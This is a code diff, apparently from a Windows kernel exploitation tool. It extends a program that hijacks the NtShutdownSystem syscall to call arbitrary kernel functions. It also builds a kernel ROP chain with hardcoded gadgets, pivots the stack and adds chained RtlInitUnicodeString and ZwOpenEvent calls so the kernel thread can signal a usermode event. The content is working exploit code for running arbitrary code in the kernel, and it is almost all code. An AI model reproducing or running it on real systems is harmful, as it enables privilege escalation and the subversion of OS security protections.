@@ -31,6 +31,10 @@ int main()
     //);
     KernelCaller.RedirectCallByName("NtShutdownSystem", "MmAllocateContiguousMemory");
     void* IntervalArgAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x20, (void*)MAXULONG64);
+    void* DestinationStringArg = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x20, (void*)MAXULONG64);
+    void* SourceStringArg = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x20, (void*)MAXULONG64);
+    void* ObjectAttributeArg = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(sizeof(OBJECT_ATTRIBUTES), (void*)MAXULONG64);
+    void* OutputHandleArg = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
     void* CurrentStackOffsetAddress = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
     void* StackLimitStoreAddress = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
     void* StackAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x6000, (void*)MAXULONG64);
@@ -39,6 +43,7 @@ int main()
     std::printf("[+] Stack @ 0x%p\n", StackAllocation);
     std::printf("[+] Original Stack @ 0x%p\n", OriginalStackAllocation);
     std::printf("[+] Current Stack Offset @ 0x%p\n", CurrentStackOffsetAddress);
+    std::printf("[+] ObjectAttributeArg @ 0x%p\n", ObjectAttributeArg);
 
     if (!StackAllocation || !OriginalStackAllocation || !CurrentStackOffsetAddress || !StackLimitStoreAddress)
         return EXIT_FAILURE;
@@ -80,9 +85,18 @@ int main()
     //KernelStackManager.AddGadget(0xb4296a, "mov r11, rcx; cmp edx, dword ptr [rax]; je 0xb42978; mov eax, 0xc000000d; ret;");
     //KernelStackManager.AddGadget(0x536d2a, "mov rsp, r11; ret;");
 
+
+    // Create usermode event
+    const wchar_t* EventNameString = L"\\BaseNamedObjects\\Global\\MYSIGNALEVENT";
+    HANDLE UmEvent = CreateEventW(NULL, FALSE, FALSE, L"Global\\MYSIGNALEVENT");
+    std::printf("[+] Usermode event handle: %x\n", UmEvent);
+
+    // Open handle to event in the kernel
+    KernelStackManager.AddFunctionCall("RtlInitUnicodeString", (uint64_t)DestinationStringArg, (uint64_t)SourceStringArg);
+    KernelStackManager.AddFunctionCall("ZwOpenEvent", (uint64_t)OutputHandleArg, EVENT_MODIFY_STATE | SYNCHRONIZE, (uint64_t)ObjectAttributeArg);
+
     // pivot into thread's created stack demo
     // Grab stack limit
-
     KernelStackManager.AddFunctionCall("PsGetCurrentThread");
     KernelStackManager.AddGadget(0x256c4a, "pop rcx; ret;");
     KernelStackManager.AddValue(0x30, "stack limit");
@@ -171,10 +185,15 @@ int main()
     LARGE_INTEGER SleepInterval;
     SleepInterval.QuadPart = -10000000;
 
+    OBJECT_ATTRIBUTES ObjectAttributesData;
+    InitializeObjectAttributes(&ObjectAttributesData, (PUNICODE_STRING)DestinationStringArg, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
+
     std::uint64_t CurrentStackOffsetStartValue = 0x2000;
 
     KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
+    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(SourceStringArg, (void*)EventNameString, lstrlenW(EventNameString) * 2 + 1);
     reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(IntervalArgAllocation, &SleepInterval, sizeof(SleepInterval));
+    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(ObjectAttributeArg, &ObjectAttributesData, sizeof(OBJECT_ATTRIBUTES));
     reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
     reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 0x2000), KernelStackManager.GetStackBuffer(), KernelStackManager.GetStackSize());
     reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(OriginalStackAllocation, KernelStackManager.GetStackBuffer(), KernelStackManager.GetStackSize());
